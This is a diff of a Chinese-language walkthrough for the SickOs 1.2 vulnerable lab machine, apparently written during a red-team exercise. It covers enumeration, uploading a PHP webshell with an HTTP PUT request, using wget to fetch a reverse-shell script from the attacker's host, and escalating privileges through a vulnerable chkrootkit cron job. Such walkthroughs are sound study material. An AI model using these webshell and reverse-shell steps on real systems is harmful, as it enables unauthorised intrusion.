@@ -1,5 +1,5 @@
 # 📖 1. Preface
-护网接近尾声(最后疯狂的三天，据说无差别共计)，等到下周一(8号)就彻底结束了，唯一难受的地方在于疫情爆发，不知道回去要不要隔离(目前看来回都回不去了)。
+护网接近尾声(最后疯狂的三天，据说无差别攻击)，等到下周一(8号)就彻底结束了，唯一难受的地方在于疫情爆发，不知道回去要不要隔离(目前看来回都回不去了)。
 
 😢算了，不考虑这些不可控因素了。继续开始旅程🧑🏻‍💻。
 
@@ -49,6 +49,7 @@ OS and Service detection performed. Please report any incorrect results at https
 <img src="images/1.png" width="56%" /></br>
 
 ```shell
+# 因为输出内容中有很多空行，所以使用grep过滤一下空行
 ┌──(root㉿sk2022)-[/sickos12]
 └─# curl -s http://192.168.168.116/ | grep .* -o
 <html>
@@ -147,7 +148,7 @@ DOWNLOADED: 4612 - FOUND: 1
 最后尝试了一下使用options测试http头方法
 ### 3.1.1 curl测试
 <details>
-<summary>nmap脚本测试http方法</summary>
+<summary>curl脚本测试http头方法</summary>
 
 ```shell
 ┌──(root㉿sk2022)-[/sickos12]
@@ -210,6 +211,7 @@ MAC Address: A4:5E:60:C2:D9:0B (Apple)
 <summary>curl上传、访问，反弹shell</summary>
 
 ```shell
+# curl --upload-file参数尝试不成功，不知道为啥😤
 ┌──(root㉿sk2022)-[/sickos12]
 └─# curl -X PUT -d '<?php system($_GET["cmd"]);?>' http://192.168.168.116/test/pss.php -v
 *   Trying 192.168.168.116:80...
@@ -232,6 +234,7 @@ MAC Address: A4:5E:60:C2:D9:0B (Apple)
 └─# curl "http://192.168.168.116/test/pss.php?cmd=pwd;id"
 /var/www/test
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
+# 这里先用hURL进行一下编码
 ┌──(root㉿sk2022)-[/sickos12]
 └─# hURL -U "wget http://192.168.168.105:443/php-reverse-shell.php" -s                                        
 wget%20http%3A%2F%2F192.168.168.105%3A443%2Fphp-reverse-shell.php 
@@ -349,8 +352,7 @@ pwd
 </details>
 
 ## 4.3 msfvenom生成elf
-
- 
+原理同 4.2 msfvenom生成php 只不过过程曲折一些，先获取一个shell，然后上传msfvenom生成的elf并执行，等待反弹shell，但是感觉这就是自己想出来的绕了两圈的方法，我能想到的应用场景应该就是把拿到的webshell转移到msf上来，当然用于熟悉日常工具也是有好处的。😬
 
 
 # 📖 5. Post-Exploitation
@@ -373,6 +375,28 @@ cat newRule
 COMMIT
 # Completed on Mon Apr 25 22:48:24 2016
 ```
+再有就是在这个靶机的提权，我在内核提权上面花费了大量时间🤕，测试了很多exp但是都不成功，就是应为我太相信linux提权工具了(它报了内核%99可以提权)，后面才发现通过查看定时任务(cat /etc/crontab)有一个chkrootkit的工具是一个低版本的存在漏洞。但是在利用的过程中我存在一个疑问，明明显示的是每天6点25才执行一次，为啥真正在提权的时候却是感觉几分钟就执行一次呢，难道说chkrootkit这个运行起来后会一直会每隔几分钟执行一次/tmp/update?🤷🏿
+
+```shell
+www-data@ubuntu:/tmp$ cat /etc/crontab
+cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+```
+
 ## 5.1 编写.c并编译，并添加s属性
 ```shell
 $ cat exploit.c
